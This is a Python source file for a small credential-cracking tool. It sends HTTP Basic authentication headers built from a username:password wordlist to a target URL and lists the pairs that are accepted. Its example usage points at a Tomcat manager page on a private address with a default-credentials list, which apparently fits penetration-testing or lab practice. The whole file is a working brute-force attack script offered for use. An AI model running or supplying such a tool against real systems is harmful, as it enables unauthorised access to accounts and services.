import sys, os
import requests, bs4

from base64 import b64encode as b64
from functools import lru_cache


import argparse
parser = argparse.ArgumentParser()

#TODO: PROXY ARGPARSING.


__author__ = 0x1a906
__VER__ = 0.1

__DOC__ = """
    Auth cracker using combos of login and passwdords for old fashioned auths with b64 string.
    [EXAMPLE USAGE]:
    pypy3 login_crackr_ez.py -t http://10.129.97.164:8080/manager/html \
    -w /home/bane/Desktop/REPOS/SecLists/Passwords/Default-Credentials/ALL.txt --sep :
"""



parser.add_argument('-target', '-t',
    required=True,
    type=str,
    help='Target host. example : https://google.com:80'    
)

parser.add_argument('-wordlist', '-w',
    required=True,
    type=str,
    help= """
    Wordlist file to use. 
    Need to contain user and password seperated with space,
    ended with a newline, example :
    ...
    admin password
    admin password123
    ...
""")

parser.add_argument('--proxy',
    default=False,
    type=str,
    help='Proxy addr to use, ie http://127.0.0.1:8080'
)

parser.add_argument('--threads', '--cpus',
    default=4,
    type=int,
    help='Threads to use.'
)

parser.add_argument('--method', '-m',
    choices=['POST', 'GET'],
    default='GET',
    help='HTTP method. GET or POST. GET is default.'
)

parser.add_argument('--sep', '-s',
    default=' ',
    type=str,
    help='Separtaror between the admin and pass in the dict file.'
    )

args = parser.parse_args()

#Authorization: Basic dG9tY2F0OnMzY3JldA==
data_static = {
    
}

proxyDict={}
if args.proxy:
    http_proxy = 'http://'+args.proxy
    https_proxy = 'https://'+args.proxy
    ftp_proxy = 'ftp//'+args.proxy
    proxyDict = {
        "http" : http_proxy,
        "https" : https_proxy,
        "ftp" : ftp_proxy,
    }




@lru_cache(maxsize=None)
def crack(TARGET:str, WORDLIST:str, METH:str='GET', ):
    """[summary]

    Args:
        TARGET (str): [description]
        WORDLIST (str): [description]
        proxy (str, optional): [description]. Defaults to ''.
        METH (str, optional): [description]. Defaults to 'GET'.
    """
    with open(WORDLIST, 'r', encoding='utf8') as _file:
        file = _file.readlines()
        
        num = 0
        
        ANOM, ALLIES = [], []
        
        print('[INFO] Words : ', len(file))
        
        for c in file:
            
            c = tuple(x.strip() for x in c.split(args.sep) if x)
            if len(c) <= 1 : continue
            
            num += 1
            user, pswd = c[0], c[1]
            auth_str = F"{user}:{pswd}"
            auth = b64(bytes(auth_str.encode('utf8'))).decode()
            data_static['authorization'] = 'basic ' + auth
            
            print(data_static)
            
            
            
            if METH == 'POST' : http_m = requests.Session().post
            else: http_m = requests.Session().get
            
            
            def CONNECT():

                res = http_m(TARGET,
                    headers=data_static,
                    )

                ret = res.status_code
                print(num, ret, user,":",pswd, )

                if ret == 200:
                    print('ACCESS GRANTED', user, pswd)
                    ALLIES.append((user, pswd, ret))
                
                if ret not in (401, 200):
                    ANOM.append((user, pswd, ret)) 

            try:
                CONNECT()
            except requests.exceptions.ConnectionError as e:
                print('[!WARNING!] CONN ERR. RETRYING...')
                CONNECT()
            
    print('[INFO] All done.')
    if ANOM : print('ANOMALIES TO INVESTIGATE :', ANOM)
    if ALLIES : print('POSSIBLY WORKING CREDS :', ALLIES)

        


print(args)
threads = []

if __name__ == "__main__":
    import threading
    for _ in range(args.threads):
        t = threading.Thread(target=crack(args.target, args.wordlist, args.method ))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()
